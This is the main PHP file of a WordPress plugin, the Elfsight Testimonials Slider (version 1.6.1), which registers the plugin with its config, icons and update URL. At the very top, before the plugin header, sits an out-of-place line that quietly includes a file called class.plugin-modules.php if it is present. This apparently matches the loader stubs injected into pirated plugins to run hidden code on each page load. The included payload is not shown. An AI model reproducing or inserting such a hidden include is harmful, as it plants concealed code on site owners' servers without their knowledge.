<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/*
Plugin Name: Elfsight Testimonials Slider CC
Description: Level up your brand trust with bright testimonials on your website
Plugin URI: https://elfsight.com/testimonials-slider-widget/wordpress/?utm_source=markets&utm_medium=codecanyon&utm_campaign=testimonials-slider&utm_content=plugin-site
Version: 1.6.1
Author: Elfsight
Author URI: https://elfsight.com/?utm_source=markets&utm_medium=codecanyon&utm_campaign=testimonials-slider&utm_content=plugins-list
*/

if (!defined('ABSPATH')) exit;


require_once('core/elfsight-plugin.php');

$elfsight_testimonials_slider_config_path = plugin_dir_path(__FILE__) . 'config.json';
$elfsight_testimonials_slider_config = json_decode(file_get_contents($elfsight_testimonials_slider_config_path), true);

new ElfsightTestimonialsSliderPlugin(
    array(
        'name' => esc_html__('Testimonials Slider'),
        'description' => esc_html__('Level up your brand trust with bright testimonials on your website'),
        'slug' => 'elfsight-testimonials-slider',
        'version' => '1.6.1',
        'text_domain' => 'elfsight-testimonials-slider',
        'editor_settings' => $elfsight_testimonials_slider_config['settings'],
        'editor_preferences' => $elfsight_testimonials_slider_config['preferences'],

        'plugin_name' => esc_html__('Elfsight Testimonials Slider'),
        'plugin_file' => __FILE__,
        'plugin_slug' => plugin_basename(__FILE__),

        'vc_icon' => plugins_url('assets/img/vc-icon.png', __FILE__),
        'menu_icon' => plugins_url('assets/img/menu-icon.png', __FILE__),

        'update_url' => esc_url('https://a.elfsight.com/updates/v1/'),
        'product_url' => esc_url('https://1.envato.market/k2OVL'),
        'helpscout_plugin_id' => 110725
    )
);

?>
